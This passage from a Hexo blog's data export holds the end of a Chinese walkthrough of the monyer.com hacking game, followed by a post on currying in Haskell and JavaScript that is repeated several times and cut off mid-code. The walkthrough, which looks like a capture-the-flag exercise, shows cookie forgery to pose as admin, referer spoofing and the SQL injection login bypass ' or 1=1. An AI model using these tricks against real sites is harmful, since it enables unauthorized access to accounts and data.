class=\"line\">5736396</div></pre></td></tr></table></figure>\n<p>下一关</p>\n<h1 id=\"第九关\"><a href=\"#第九关\" class=\"headerlink\" title=\"第九关\"></a>第九关</h1><p><a href=\"http://monyer.com/game/game1/5736396.php\">http://monyer.com/game/game1/5736396.php</a></p>\n<p>在命令行里输入：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">wget http://monyer.com/game/game1/img/4681851790659554.jpg</div><div class=\"line\">cat 4681851790659554.jpg</div></pre></td></tr></table></figure></p>\n<p>密码藏在图片里<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div></pre></td><td class=\"code\"><pre><div class=\"line\">���^�v��*&#123;I�z��^�iؾSRW�V�6�Z��(����H�����ٹ�����</div><div class=\"line\">�Ǿ���ʽ�ʲô���ţ�</div><div class=\"line\">�ԣ�������������������......��</div><div class=\"line\">��ϲ�㣡</div><div class=\"line\">��ʮ������Ϊ��MonyerLikeYou_the10level</div><div class=\"line\">�����ڿ�ʼ�漰������Ķ�̬���������㶼���԰���ʾ������ɵģ�</div><div class=\"line\">�����Լ���û��ģ�%</div></pre></td></tr></table></figure></p>\n<p>MonyerLikeYou_the10level</p>\n<h1 id=\"第十关\"><a href=\"#第十关\" class=\"headerlink\" title=\"第十关\"></a>第十关</h1><p><a href=\"http://monyer.com/game/game1/MonyerLikeYou_the10level.php\">http://monyer.com/game/game1/MonyerLikeYou_the10level.php</a></p>\n<blockquote>\n<p>当前用户身份为simpleuser 不是admin，无法显示下一关密码</p>\n</blockquote>\n<p>很显然这是一道session/cookie欺骗题</p>\n<p>在console里直接输入<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">document.cookie=&quot;username=admin&quot;</div></pre></td></tr></table></figure></p>\n<p>刷新</p>\n<blockquote>\n<p>好聪明哦！下一关密码为：doyouknow</p>\n</blockquote>\n<p>下一关！</p>\n<h1 id=\"第十一关\"><a href=\"#第十一关\" class=\"headerlink\" title=\"第十一关\"></a>第十一关</h1><p><a href=\"http://monyer.com/game/game1/doyouknow.php?action=show_login_false\">http://monyer.com/game/game1/doyouknow.php?action=show_login_false</a></p>\n<blockquote>\n<p>你的session不是passer，不能查看下一关密码</p>\n</blockquote>\n<p>在console里直接输入<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">document.cookie=&quot;username=passer&quot;</div></pre></td></tr></table></figure></p>\n<p>刷新，好像不对哦，monyer骗我，哼！</p>\n<p>再看标题 action=show_login_false </p>\n<p><a href=\"http://monyer.com/game/game1/doyouknow.php?action=show_login_true\">http://monyer.com/game/game1/doyouknow.php?action=show_login_true</a></p>\n<blockquote>\n<p>您的session为passer，所以您可以查看下一关密码：smartboy</p>\n</blockquote>\n<p>下一关！</p>\n<h1 id=\"第十二关\"><a href=\"#第十二关\" class=\"headerlink\" title=\"第十二关\"></a>第十二关</h1><p><a href=\"http://monyer.com/game/game1/smartboy.php\">http://monyer.com/game/game1/smartboy.php</a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">JTRBJTU0JTYzJTdBJTRBJTU0JTVBJTQ3JTRBJTU0JTU5JTc5JTRBJTU0JTU5JTMxJTRBJTU0JTU5JTc4JTRBJTU0JTYzJTMxJTRBJTU0JTYzJTMwJTRBJTU0JTU5JTM1JTRBJTU0JTU5JTMyJTRBJTU0JTYzJTMxJTRBJTU0JTVBJTQ0JTRBJTU0JTRBJTQ2JTRBJTU0JTYzJTc3JTRBJTU0JTU5JTM0JTRBJTU0JTYzJTc3</div></pre></td></tr></table></figure>\n<p>直觉告诉我，这显然是Base64 解密<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">%4A%54%63%7A%4A%54%5A%47%4A%54%59%79%4A%54%59%31%4A%54%59%78%4A%54%63%31%4A%54%63%30%4A%54%59%35%4A%54%59%32%4A%54%63%31%4A%54%5A%44%4A%54%4A%46%4A%54%63%77%4A%54%59%34%4A%54%63%77</div></pre></td></tr></table></figure></p>\n<p>直觉告诉我，这显然是 UrlEncode 解密</p>\n<p>JTczJTZGJTYyJTY1JTYxJTc1JTc0JTY5JTY2JTc1JTZDJTJFJTcwJTY4JTcw</p>\n<p>直觉再次告诉我，这显然是 Base64 解密</p>\n<p>%73%6F%62%65%61%75%74%69%66%75%6C%2E%70%68%70</p>\n<p>直觉再次告诉我，这显然是  UrlEncode 解密</p>\n<p>sobeautiful.php</p>\n<p>不错 密码就是sobeautiful</p>\n<h1 id=\"第十三关\"><a href=\"#第十三关\" class=\"headerlink\" title=\"第十三关\"></a>第十三关</h1><p><a href=\"http://monyer.com/game/game1/sobeautiful.php\">http://monyer.com/game/game1/sobeautiful.php</a></p>\n<blockquote>\n<p>本页禁止盗链！</p>\n</blockquote>\n<p>wtf..显然他判断了http来源，需要伪造http referer，那么我们在之前的第十二关的审查代码中加入：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>= <span class=\"string\">\"http://monyer.com/game/game1/sobeautiful.php\"</span>&gt;</span> 简便伪造referer<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></div></pre></td></tr></table></figure>\n<blockquote>\n<p>欢迎您来到第13关</p>\n<p>请输入密码进入第14关：</p>\n<p>没有输入密码 或 密码错误 或 系统错误！</p>\n</blockquote>\n<p>看源代码有post提交</p>\n<p>这是一道SQL 注入题</p>\n<p>试试我大万能密码！<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">&apos; or 1=1</div></pre></td></tr></table></figure></p>\n<p>万能密码熟记于心</p>\n<blockquote>\n<p>下一关密码：whatyouneverknow</p>\n</blockquote>\n<p>下一关！</p>\n<h1 id=\"第十四关\"><a href=\"#第十四关\" class=\"headerlink\" title=\"第十四关\"></a>第十四关</h1><p><a href=\"http://monyer.com/game/game1/whatyouneverknow.php\">http://monyer.com/game/game1/whatyouneverknow.php</a></p>\n<p>感谢@Echowxsy提供第14关解密过程</p>\n<p><img src=\"/content/images/monyerhack/01.jpg\" alt=\"\"></p>\n<p><img src=\"/content/images/monyerhack/02.jpg\" alt=\"\"></p>\n<p><img src=\"/content/images/monyerhack/03.jpg\" alt=\"\"></p>\n<p><img src=\"/content/images/monyerhack/1.jpg\" alt=\"\"></p>\n<p><img src=\"/content/images/monyerhack/2.jpg\" alt=\"\"></p>\n<p><img src=\"/content/images/monyerhack/3.jpg\" alt=\"\"></p>\n<p><img src=\"/content/images/monyerhack/5.jpg\" alt=\"\"></p>\n<h1 id=\"第十五关\"><a href=\"#第十五关\" class=\"headerlink\" title=\"第十五关\"></a>第十五关</h1><p><img src=\"/content/images/monyerhack/4.png\" alt=\"\"></p>"},{"title":"浅谈函数式编程柯里化","date":"2017-02-11T18:27:57.000Z","header-img":"/content/images/f2e/post-bg-js-version.jpg","_content":"\n\n\n百度百科里对柯里化的定义是\n\n> 在计算机科学中，柯里化（Currying）是把接受多个参数的函数变换成接受一个单一参数(最初函数的第一个参数)的函数，并且返回接受余下的参数且返回结果的新函数的技术。这个技术由 Christopher Strachey 以逻辑学家 Haskell Curry 命名的，尽管它是 Moses Schnfinkel 和 Gottlob Frege 发明的。\n\n简直看不懂哦，Talk is Cheap，我们拿一个简单的haskell程序说明什么叫\n\n## 自动柯里化\n\n两数相加，返回结果：\n\n```has\nfun add x y = x + y\n```\n\n这是一个典型的柯里化的版本，当我输入 ``(add 1) 2`` 时与``add 1 2`` 的返回结果一模一样，都是3\n\n```haskell\nPrelude> (add 1) 2\n3\n```\n\n但是，换个角度上讲，我明明设置了两个“变量”，在haskell里却把它们的结果又封装成了一个函数，这就是haskell的强大特性：自动柯里化，haskell全部帮你自动处理了。\n\n简单来说，柯里化指的是函数里只接收一个余下的参数，再调用原函数，返回出相应的结果。\n\n而同样的，没有柯里化的普通版本却是这样的：\n\n```haskell\nfun add(x, y) = x + y\n```\n\n这个版本里，只能通过``add(1,2)``进行相加操作。\n\n柯里化实际上是将高阶函数进行降阶处理，没理解？接着看~ \n\n## JavaScript的柯里化\n\nJavaScript存在**闭包**的特性，能够很好的为我们将函数柯里化，但是很可惜JavaScript不支持自动柯里化，这意味着，我们要自己写柯里化的过程，不过还好，这能有效的让我们理解，到底什么是柯里化。\n\n同样的，还是那个add的简单函数，用JavaScript实现如下：\n\n```javascript\nfunction add(x, y){\n\tif(y===undefined){\n\t\treturn (z) => x + z;\n\t}else{\n\t\treturn x+y;\n\t}\n}\n```\n\n测试一下！通过执行``add(1)(2)``，果然返回了``3``，是的，这是一个手动构造柯里化函数的过程。对于大多数函数，我们有通用的柯里化方法：\n\n```javascript\nfunction curry(func) {\n  var fixedArgs = [].slice.call(arguments,1);\n  return function() {\n    args = fixedArgs.concat([].slice.call(arguments))\n    return func.apply(null, args);\n  };\n}\n```\n\n也就是说，对于`add`函数来说，我们用一个函数生成了另一个范围更小的函数，一层接一层的解决问题。这符合函数式编程的思想，就是我们更关注**函数**与**函数**之间的关系，而非状态本身，更在乎局部而非整体。\n\n这个例子体现不出这种思想的精妙之处，那么我们再举一个例子🌰\n\n如果，我们想让一个已知的数组每个值都做加1操作，传统的方法该怎么做？\n\n```javascript\nlet ar = [1,2,3];\nar.map((x)=> x+1);\n```\n\n对吧？那么我们下面可以用柯里化的思想把这个问题实现：\n\n```javascript\nconst add = ar => ar.map(x => x + 1);\nadd([1, 2, 3]);\n```\n\n首先我们在`add`里定义了一个函数，并且传入参数为`ar`，`ar`进行`Array.prototype.map()`操作，对每一个数进行遍历，并且返回这个数字+1后的值给`ar`，这看起来挺玄乎的，但确实可行，我们只关心局部，请试图把`add`当做数学里中的函数去思考理解，或许会好懂的多。可是这只是方便了我们理解，那么到底有什么好处呢？\n\n再举一个例子🌰\n\n如果我们想写一个函数，用来对已知数组的已知量进行相加n的操作，怎么写？传统方法\n\n```javascript\nlet ar= [1,2,3];\nfunction addToArray(ar,n){\n  return ar.map((x)=> x+n)\n};\nconsole.log(addToArray(ar,1));\n```\n\n但是，我们可以这样写：\n\n```javascript\nconst add = a => b => a+b;\nconst addToArray = (ar,n) => ar.map(add(n));\naddToArray([2,3],1)\n```\n\n结果都一样，其实过程是不一样的，你可能真的憋不住了，到底有什么用呢？\n\n# 柯里化的好处\n\n就像上面的例子一样，你能看出不同吗？对，第一个的实质是新写了一个函数，对数组进行map操作，而第二个则是在直接在`map`里进行`add`操作，这很通用，一旦你写了很多类似于``add``的函数，就会方便起来，可以让我们方便的在`map`,`reduce`,`filter`里调用。\n\n* 能够进行延迟计算，就像add(1)(2)一样，1比2先传入，2就会被延迟计算，在特定的场景里，有一定的应用意义。\n* 当你发现你要调用一个函数，并且调用参数都是一样的情况下，这个参数就可以被柯里化，以便更好的完成任务。\n* 优雅的写法，允许你写出来的代码更干净、更有表达力。\n\n虽然柯里化在日常应用不多，但仍然是一个不可不了解的好概念。\n\n# 相关阅读\n\n[ JavaScript柯里化](https://cnodejs.org/topic/56261a249b48ca9448b776c4)\n\n[Currying and ES6 Arrow Functions](http://codekirei.com/posts/currying-with-arrow-functions/)\n\n[浅析 JavaScript 中的 函数 currying 柯里化](http://www.cnblogs.com/zztt/p/4142891.html)\n\n[Currying - Part 6 of Functional Programming in JavaScript(需梯子)](https://www.youtube.com/watch?v=iZLP4qOwY8I)","source":"_posts/函数式编程柯里化.md","raw":"---\ntitle: 浅谈函数式编程柯里化\ndate: 2017-02-11 18:27:57\npermalink: currying\ntags: Web\ncategories: Web\nheader-img: \"/content/images/f2e/post-bg-js-version.jpg\"\n---\n\n\n\n百度百科里对柯里化的定义是\n\n> 在计算机科学中，柯里化（Currying）是把接受多个参数的函数变换成接受一个单一参数(最初函数的第一个参数)的函数，并且返回接受余下的参数且返回结果的新函数的技术。这个技术由 Christopher Strachey 以逻辑学家 Haskell Curry 命名的，尽管它是 Moses Schnfinkel 和 Gottlob Frege 发明的。\n\n简直看不懂哦，Talk is Cheap，我们拿一个简单的haskell程序说明什么叫\n\n## 自动柯里化\n\n两数相加，返回结果：\n\n```has\nfun add x y = x + y\n```\n\n这是一个典型的柯里化的版本，当我输入 ``(add 1) 2`` 时与``add 1 2`` 的返回结果一模一样，都是3\n\n```haskell\nPrelude> (add 1) 2\n3\n```\n\n但是，换个角度上讲，我明明设置了两个“变量”，在haskell里却把它们的结果又封装成了一个函数，这就是haskell的强大特性：自动柯里化，haskell全部帮你自动处理了。\n\n简单来说，柯里化指的是函数里只接收一个余下的参数，再调用原函数，返回出相应的结果。\n\n而同样的，没有柯里化的普通版本却是这样的：\n\n```haskell\nfun add(x, y) = x + y\n```\n\n这个版本里，只能通过``add(1,2)``进行相加操作。\n\n柯里化实际上是将高阶函数进行降阶处理，没理解？接着看~ \n\n## JavaScript的柯里化\n\nJavaScript存在**闭包**的特性，能够很好的为我们将函数柯里化，但是很可惜JavaScript不支持自动柯里化，这意味着，我们要自己写柯里化的过程，不过还好，这能有效的让我们理解，到底什么是柯里化。\n\n同样的，还是那个add的简单函数，用JavaScript实现如下：\n\n```javascript\nfunction add(x, y){\n\tif(y===undefined){\n\t\treturn (z) => x + z;\n\t}else{\n\t\treturn x+y;\n\t}\n}\n```\n\n测试一下！通过执行``add(1)(2)``，果然返回了``3``，是的，这是一个手动构造柯里化函数的过程。对于大多数函数，我们有通用的柯里化方法：\n\n```javascript\nfunction curry(func) {\n  var fixedArgs = [].slice.call(arguments,1);\n  return function() {\n    args = fixedArgs.concat([].slice.call(arguments))\n    return func.apply(null, args);\n  };\n}\n```\n\n也就是说，对于`add`函数来说，我们用一个函数生成了另一个范围更小的函数，一层接一层的解决问题。这符合函数式编程的思想，就是我们更关注**函数**与**函数**之间的关系，而非状态本身，更在乎局部而非整体。\n\n这个例子体现不出这种思想的精妙之处，那么我们再举一个例子🌰\n\n如果，我们想让一个已知的数组每个值都做加1操作，传统的方法该怎么做？\n\n```javascript\nlet ar = [1,2,3];\nar.map((x)=> x+1);\n```\n\n对吧？那么我们下面可以用柯里化的思想把这个问题实现：\n\n```javascript\nconst add = ar => ar.map(x => x + 1);\nadd([1, 2, 3]);\n```\n\n首先我们在`add`里定义了一个函数，并且传入参数为`ar`，`ar`进行`Array.prototype.map()`操作，对每一个数进行遍历，并且返回这个数字+1后的值给`ar`，这看起来挺玄乎的，但确实可行，我们只关心局部，请试图把`add`当做数学里中的函数去思考理解，或许会好懂的多。可是这只是方便了我们理解，那么到底有什么好处呢？\n\n再举一个例子🌰\n\n如果我们想写一个函数，用来对已知数组的已知量进行相加n的操作，怎么写？传统方法\n\n```javascript\nlet ar= [1,2,3];\nfunction addToArray(ar,n){\n  return ar.map((x)=> x+n)\n};\nconsole.log(addToArray(ar,1));\n```\n\n但是，我们可以这样写：\n\n```javascript\nconst add = a => b => a+b;\nconst addToArray = (ar,n) => ar.map(add(n));\naddToArray([2,3],1)\n```\n\n结果都一样，其实过程是不一样的，你可能真的憋不住了，到底有什么用呢？\n\n# 柯里化的好处\n\n就像上面的例子一样，你能看出不同吗？对，第一个的实质是新写了一个函数，对数组进行map操作，而第二个则是在直接在`map`里进行`add`操作，这很通用，一旦你写了很多类似于``add``的函数，就会方便起来，可以让我们方便的在`map`,`reduce`,`filter`里调用。\n\n* 能够进行延迟计算，就像add(1)(2)一样，1比2先传入，2就会被延迟计算，在特定的场景里，有一定的应用意义。\n* 当你发现你要调用一个函数，并且调用参数都是一样的情况下，这个参数就可以被柯里化，以便更好的完成任务。\n* 优雅的写法，允许你写出来的代码更干净、更有表达力。\n\n虽然柯里化在日常应用不多，但仍然是一个不可不了解的好概念。\n\n# 相关阅读\n\n[ JavaScript柯里化](https://cnodejs.org/topic/56261a249b48ca9448b776c4)\n\n[Currying and ES6 Arrow Functions](http://codekirei.com/posts/currying-with-arrow-functions/)\n\n[浅析 JavaScript 中的 函数 currying 柯里化](http://www.cnblogs.com/zztt/p/4142891.html)\n\n[Currying - Part 6 of Functional Programming in JavaScript(需梯子)](https://www.youtube.com/watch?v=iZLP4qOwY8I)","slug":"currying","published":1,"updated":"2017-03-08T19:05:11.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cj2mm9xow002d5es51c2gin6t","content":"<p>百度百科里对柯里化的定义是</p>\n<blockquote>\n<p>在计算机科学中，柯里化（Currying）是把接受多个参数的函数变换成接受一个单一参数(最初函数的第一个参数)的函数，并且返回接受余下的参数且返回结果的新函数的技术。这个技术由 Christopher Strachey 以逻辑学家 Haskell Curry 命名的，尽管它是 Moses Schnfinkel 和 Gottlob Frege 发明的。</p>\n</blockquote>\n<p>简直看不懂哦，Talk is Cheap，我们拿一个简单的haskell程序说明什么叫</p>\n<h2 id=\"自动柯里化\"><a href=\"#自动柯里化\" class=\"headerlink\" title=\"自动柯里化\"></a>自动柯里化</h2><p>两数相加，返回结果：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">fun add x y = x + y</div></pre></td></tr></table></figure>\n<p>这是一个典型的柯里化的版本，当我输入 <code>(add 1) 2</code> 时与<code>add 1 2</code> 的返回结果一模一样，都是3</p>\n<figure class=\"highlight haskell\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"type\">Prelude</span>&gt; (add <span class=\"number\">1</span>) <span class=\"number\">2</span></div><div class=\"line\"><span class=\"number\">3</span></div></pre></td></tr></table></figure>\n<p>但是，换个角度上讲，我明明设置了两个“变量”，在haskell里却把它们的结果又封装成了一个函数，这就是haskell的强大特性：自动柯里化，haskell全部帮你自动处理了。</p>\n<p>简单来说，柯里化指的是函数里只接收一个余下的参数，再调用原函数，返回出相应的结果。</p>\n<p>而同样的，没有柯里化的普通版本却是这样的：</p>\n<figure class=\"highlight haskell\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"title\">fun</span> add(x, y) = x + y</div></pre></td></tr></table></figure>\n<p>这个版本里，只能通过<code>add(1,2)</code>进行相加操作。</p>\n<p>柯里化实际上是将高阶函数进行降阶处理，没理解？接着看~ </p>\n<h2 id=\"JavaScript的柯里化\"><a href=\"#JavaScript的柯里化\" class=\"headerlink\" title=\"JavaScript的柯里化\"></a>JavaScript的柯里化</h2><p>JavaScript存在<strong>闭包</strong>的特性，能够很好的为我们将函数柯里化，但是很可惜JavaScript不支持自动柯里化，这意味着，我们要自己写柯里化的过程，不过还好，这能有效的让我们理解，到底什么是柯里化。</p>\n<p>同样的，还是那个add的简单函数，用JavaScript实现如下：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">add</span>(<span class=\"params\">x, y</span>)</span>&#123;</div><div class=\"line\">\t<span class=\"keyword\">if</span>(y===<span class=\"literal\">undefined</span>)&#123;</div><div class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"function\">(<span class=\"params\">z</span>) =&gt;</span> x + z;</div><div class=\"line\">\t&#125;<span class=\"keyword\">else</span>&#123;</div><div class=\"line\">\t\t<span class=\"keyword\">return</span> x+y;</div><div class=\"line\">\t&#125;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>\n<p>测试一下！通过执行<code>add(1)(2)</code>，果然返回了<code>3</code>，是的，这是一个手动构造柯里化函数的过程。对于大多数函数，我们有通用的柯里化方法：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">curry</span>(<span class=\"params\">func</span>) </span>&#123;</div><div class=\"line\">  <span class=\"keyword\">var</span> fixedArgs = [].slice.call(<span class=\"built_in\">arguments</span>,<span class=\"number\">1</span>);</div><div class=\"line\">  <span class=\"keyword\">return</span> <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</div><div class=\"line\">    args = fixedArgs.concat([].slice.call(<span class=\"built_in\">arguments</span>))</div><div class=\"line\">    <span class=\"keyword\">return</span> func.apply(<span class=\"literal\">null</span>, args);</div><div class=\"line\">  &#125;;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>\n<p>也就是说，对于<code>add</code>函数来说，我们用一个函数生成了另一个范围更小的函数，一层接一层的解决问题。这符合函数式编程的思想，就是我们更关注<strong>函数</strong>与<strong>函数</strong>之间的关系，而非状态本身，更在乎局部而非整体。</p>\n<p>这个例子体现不出这种思想的精妙之处，那么我们再举一个例子🌰</p>\n<p>如果，我们想让一个已知的数组每个值都做加1操作，传统的方法该怎么做？</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">let</span> ar = [<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>];</div><div class=\"line\">ar.map(<span class=\"function\">(<span class=\"params\">x</span>)=&gt;</span> x+<span class=\"number\">1</span>);</div></pre></td></tr></table></figure>\n<p>对吧？那么我们下面可以用柯里化的思想把这个问题实现：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">const</span> add = <span class=\"function\"><span class=\"params\">ar</span> =&gt;</span> ar.map(<span class=\"function\"><span class=\"params\">x</span> =&gt;</span> x + <span class=\"number\">1</span>);</div><div class=\"line\">add([<span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>]);</div></pre></td></tr></table></figure>\n<p>首先我们在<code>add</code>里定义了一个函数，并且传入参数为<code>ar</code>，<code>ar</code>进行<code>Array.prototype.map()</code>操作，对每一个数进行遍历，并且返回这个数字+1后的值给<code>ar</code>，这看起来挺玄乎的，但确实可行，我们只关心局部，请试图把<code>add</code>当做数学里中的函数去思考理解，或许会好懂的多。可是这只是方便了我们理解，那么到底有什么好处呢？</p>\n<p>再举一个例子🌰</p>\n<p>如果我们想写一个函数，用来对已知数组的已知量进行相加n的操作，怎么写？传统方法</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">let</span> ar= [<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>];</div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">addToArray</span>(<span class=\"params\">ar,n</span>)</span>&#123;</div><div class=\"line\">  <span class=\"keyword\">return</span> ar.map(<span class=\"function\">(<span class=\"params\">x</span>)=&gt;</span> x+n)</div><div class=\"line\">&#125;;</div><div class=\"line\"><span class=\"built_in\">console</span>.log(addToArray(ar,<span class=\"number\">1</span>));</div></pre></td></tr></table></figure>\n<p>但是，我们可以这样写：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">const</span> add = <span class=\"function\"><span class=\"params\">a</span> =&gt;</span> b =&gt; a+b;</div><div class=\"line\"><span class=\"keyword\">const</span> addToArray = <span class=\"function\">(<span class=\"params\">ar,n</span>) =&gt;</span> ar.map(add(n));</div><div class=\"line\">addToArray([<span class=\"number\">2</span>,<span class=\"number\">3</span>],<span class=\"number\">1</span>)</div></pre></td></tr></table></figure>\n<p>结果都一样，其实过程是不一样的，你可能真的憋不住了，到底有什么用呢？</p>\n<h1 id=\"柯里化的好处\"><a href=\"#柯里化的好处\" class=\"headerlink\" title=\"柯里化的好处\"></a>柯里化的好处</h1><p>就像上面的例子一样，你能看出不同吗？对，第一个的实质是新写了一个函数，对数组进行map操作，而第二个则是在直接在<code>map</code>里进行<code>add</code>操作，这很通用，一旦你写了很多类似于<code>add</code>的函数，就会方便起来，可以让我们方便的在<code>map</code>,<code>reduce</code>,<code>filter</code>里调用。</p>\n<ul>\n<li>能够进行延迟计算，就像add(1)(2)一样，1比2先传入，2就会被延迟计算，在特定的场景里，有一定的应用意义。</li>\n<li>当你发现你要调用一个函数，并且调用参数都是一样的情况下，这个参数就可以被柯里化，以便更好的完成任务。</li>\n<li>优雅的写法，允许你写出来的代码更干净、更有表达力。</li>\n</ul>\n<p>虽然柯里化在日常应用不多，但仍然是一个不可不了解的好概念。</p>\n<h1 id=\"相关阅读\"><a href=\"#相关阅读\" class=\"headerlink\" title=\"相关阅读\"></a>相关阅读</h1><p><a href=\"https://cnodejs.org/topic/56261a249b48ca9448b776c4\" target=\"_blank\" rel=\"external\"> JavaScript柯里化</a></p>\n<p><a href=\"http://codekirei.com/posts/currying-with-arrow-functions/\" target=\"_blank\" rel=\"external\">Currying and ES6 Arrow Functions</a></p>\n<p><a href=\"http://www.cnblogs.com/zztt/p/4142891.html\" target=\"_blank\" rel=\"external\">浅析 JavaScript 中的 函数 currying 柯里化</a></p>\n<p><a href=\"https://www.youtube.com/watch?v=iZLP4qOwY8I\" target=\"_blank\" rel=\"external\">Currying - Part 6 of Functional Programming in JavaScript(需梯子)</a></p>\n","excerpt":"","more":"<p>百度百科里对柯里化的定义是</p>\n<blockquote>\n<p>在计算机科学中，柯里化（Currying）是把接受多个参数的函数变换成接受一个单一参数(最初函数的第一个参数)的函数，并且返回接受余下的参数且返回结果的新函数的技术。这个技术由 Christopher Strachey 以逻辑学家 Haskell Curry 命名的，尽管它是 Moses Schnfinkel 和 Gottlob Frege 发明的。</p>\n</blockquote>\n<p>简直看不懂哦，Talk is Cheap，我们拿一个简单的haskell程序说明什么叫</p>\n<h2 id=\"自动柯里化\"><a href=\"#自动柯里化\" class=\"headerlink\" title=\"自动柯里化\"></a>自动柯里化</h2><p>两数相加，返回结果：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">fun add x y = x + y</div></pre></td></tr></table></figure>\n<p>这是一个典型的柯里化的版本，当我输入 <code>(add 1) 2</code> 时与<code>add 1 2</code> 的返回结果一模一样，都是3</p>\n<figure class=\"highlight haskell\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"type\">Prelude</span>&gt; (add <span class=\"number\">1</span>) <span class=\"number\">2</span></div><div class=\"line\"><span class=\"number\">3</span></div></pre></td></tr></table></figure>\n<p>但是，换个角度上讲，我明明设置了两个“变量”，在haskell里却把它们的结果又封装成了一个函数，这就是haskell的强大特性：自动柯里化，haskell全部帮你自动处理了。</p>\n<p>简单来说，柯里化指的是函数里只接收一个余下的参数，再调用原函数，返回出相应的结果。</p>\n<p>而同样的，没有柯里化的普通版本却是这样的：</p>\n<figure class=\"highlight haskell\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"title\">fun</span> add(x, y) = x + y</div></pre></td></tr></table></figure>\n<p>这个版本里，只能通过<code>add(1,2)</code>进行相加操作。</p>\n<p>柯里化实际上是将高阶函数进行降阶处理，没理解？接着看~ </p>\n<h2 id=\"JavaScript的柯里化\"><a href=\"#JavaScript的柯里化\" class=\"headerlink\" title=\"JavaScript的柯里化\"></a>JavaScript的柯里化</h2><p>JavaScript存在<strong>闭包</strong>的特性，能够很好的为我们将函数柯里化，但是很可惜JavaScript不支持自动柯里化，这意味着，我们要自己写柯里化的过程，不过还好，这能有效的让我们理解，到底什么是柯里化。</p>\n<p>同样的，还是那个add的简单函数，用JavaScript实现如下：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">add</span>(<span class=\"params\">x, y</span>)</span>&#123;</div><div class=\"line\">\t<span class=\"keyword\">if</span>(y===<span class=\"literal\">undefined</span>)&#123;</div><div class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"function\">(<span class=\"params\">z</span>) =&gt;</span> x + z;</div><div class=\"line\">\t&#125;<span class=\"keyword\">else</span>&#123;</div><div class=\"line\">\t\t<span class=\"keyword\">return</span> 